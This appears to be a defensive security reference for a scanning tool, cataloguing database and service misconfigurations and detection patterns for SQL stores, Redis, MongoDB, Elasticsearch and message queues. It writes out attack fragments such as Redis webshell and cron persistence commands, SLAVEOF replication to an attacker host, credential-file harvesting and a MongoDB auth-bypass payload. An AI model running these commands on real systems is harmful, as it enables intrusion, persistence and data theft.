# Databases & Services — Security Reference

> Cross-cutting reference loaded when database clients, ORMs, or service configs are detected.
> Covers misconfigurations, injection, data exfiltration, and privilege escalation across common data stores and services.

## Code Vulnerabilities (OWASP)

### SQL Databases (PostgreSQL, MySQL, MSSQL, SQLite)

**Injection & Query Safety:**
- Raw string interpolation in queries: `f"SELECT * FROM users WHERE id = {user_id}"` — SQLi
- ORM raw/literal methods bypass parameterization: `.raw()`, `.execute()`, `text()`, `Arel.sql()`
- `LIKE` with unescaped `%` / `_` — pattern injection (data leakage, DoS on large tables)
- Stored procedures with dynamic SQL: `EXECUTE IMMEDIATE`, `sp_executesql @user_input`
- Second-order SQLi: user input stored, later interpolated into a different query
- `LOAD DATA LOCAL INFILE` (MySQL) — client-side file read via server request
- `COPY TO/FROM` (PostgreSQL) — file read/write on server filesystem
- `INTO OUTFILE` / `INTO DUMPFILE` (MySQL) — write query results to server filesystem
- `xp_cmdshell` (MSSQL) — OS command execution from SQL
- `pg_read_file()`, `pg_ls_dir()` (PostgreSQL) — filesystem access functions
- SQLite `ATTACH DATABASE '/path/file'` — write arbitrary files if DB is writable

**Authentication & Access:**
- Default/empty passwords on database instances (especially dev/staging)
- Overly broad `GRANT ALL` — least privilege violations
- Connection strings with credentials in source code or config files
- `trust` authentication in `pg_hba.conf` — no password required
- `skip-grant-tables` (MySQL) — disables auth entirely
- `sa` account with weak password (MSSQL)
- Database users with `SUPERUSER` / `DBA` role unnecessarily

**Configuration:**
- Listening on `0.0.0.0` instead of `127.0.0.1` / unix socket
- TLS/SSL not enforced for client connections (`sslmode=disable`, `useSSL=false`)
- Audit logging disabled — no trail for data access
- Auto-backup to world-readable paths
- `.sql` dump files committed to repositories

### Redis

**Authentication & Access:**
- No `requirepass` set — unauthenticated access by default
- `CONFIG SET` — runtime reconfiguration (change save paths, load modules)
- `CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET payload '<?php...'` — webshell via Redis
- `SLAVEOF` / `REPLICAOF` — force replication to attacker-controlled server (full data exfiltration)
- `MODULE LOAD /path/to/evil.so` — arbitrary code execution via Redis module
- `DEBUG SET-ACTIVE-EXPIRE 0` — DoS via memory exhaustion
- `FLUSHALL` / `FLUSHDB` — data destruction
- `KEYS *` in production — blocks single-threaded server
- `EVAL "os.execute('cmd')"` — Lua sandbox escape (older versions)
- Exposed on public interface without firewall rules
- Redis Sentinel / Cluster without auth between nodes
- `notify-keyspace-events` — leaking key access patterns

### MongoDB

**Authentication & Access:**
- No authentication enabled by default (pre-4.0 defaults)
- `--noauth` flag or `authorization: disabled` in config
- `$where` with user input — JavaScript injection in queries
- `$regex` with user input — ReDoS, information leakage
- `$gt`, `$ne` operator injection: `{"password": {"$ne": ""}}` — auth bypass
- `mapReduce` with user-controlled JavaScript — code execution
- `$lookup` across collections without access control — cross-collection data access
- `mongodump` outputs in accessible locations
- BSON injection via type confusion

**Configuration:**
- `bindIp: 0.0.0.0` without auth — internet-exposed
- `net.ssl.mode: disabled` — unencrypted traffic
- Profiler logging sensitive queries: `db.setProfilingLevel(2)`

### Elasticsearch / OpenSearch

**Authentication & Access:**
- No authentication by default (X-Pack Security / OpenSearch Security not enabled)
- `_search` API with user-controlled query body — data exfiltration
- `_script` endpoint — Painless/Groovy script execution
- `_snapshot` API — backup to attacker-controlled repository
- `_reindex` from remote — pull data from internal Elasticsearch instances
- `_cluster/settings` — runtime cluster reconfiguration
- `_mapping` endpoint exposing index structure
- Kibana/Dashboards without auth — visual data access

### Memcached

- No authentication mechanism — design assumption of trusted network
- UDP reflection amplification (port 11211) — DDoS vector
- `stats cachedump` — enumerate all cached keys
- Serialized object injection in cached values — deserialization attacks
- Exposed on public interface

### Message Queues (RabbitMQ, Kafka, NATS)

**RabbitMQ:**
- Default `guest:guest` credentials (accessible from localhost by default, but often misconfigured)
- Management UI exposed without auth
- Shovel/Federation to external brokers — data exfiltration
- `rabbitmqctl` access — full admin control

**Kafka:**
- No authentication/authorization by default (pre-AclAuthorizer)
- PLAINTEXT listener — unencrypted traffic
- `auto.create.topics.enable=true` — topic squatting
- Consumer group hijacking — intercept messages
- Connect API with arbitrary connector configs — SSRF, file read/write

**NATS:**
- No auth by default — subscribe to any subject
- JetStream without ACLs — persistent message access

## Threat Scan Patterns

**Database Credential Harvesting:**
- Scripts reading `~/.pgpass`, `~/.my.cnf`, `~/.mongorc.js`
- Environment variable harvesting: `$DATABASE_URL`, `$REDIS_URL`, `$MONGO_URI`
- Connection string extraction from config files, `.env`, `docker-compose.yml`
- `mysqldump --all-databases` / `pg_dumpall` — full database extraction
- `redis-cli --rdb /tmp/dump.rdb` — Redis dump to file

**Lateral Movement via Services:**
- Redis `SLAVEOF attacker:port` — weaponized replication
- Redis cron persistence: `CONFIG SET dir /var/spool/cron/crontabs; SET root "* * * * * /bin/bash -c 'cmd'"`
- Redis SSH persistence: write to `/root/.ssh/authorized_keys` via `CONFIG SET dir`
- MongoDB `db.eval()` — server-side JavaScript execution
- Elasticsearch `_scripts/stored` — persistent script execution
- MSSQL `xp_cmdshell`, `sp_OACreate` — OS command execution
- PostgreSQL `COPY ... FROM PROGRAM 'cmd'` — OS command execution
- MySQL UDF (User Defined Functions) via `lib_mysqludf_sys` — OS command execution

**Data Exfiltration via Services:**
- Replication-based: `SLAVEOF`, `REPLICAOF`, MongoDB oplog tailing, MySQL `CHANGE MASTER TO`
- Backup-based: `mysqldump`, `pg_dump`, `mongodump`, Elasticsearch `_snapshot` to remote repo
- Query-based: gradual data extraction via crafted queries, blind injection timing/boolean
- DNS-based: encoding query results in DNS lookups
- Side-channel: error messages leaking schema/data, timing differences revealing record existence
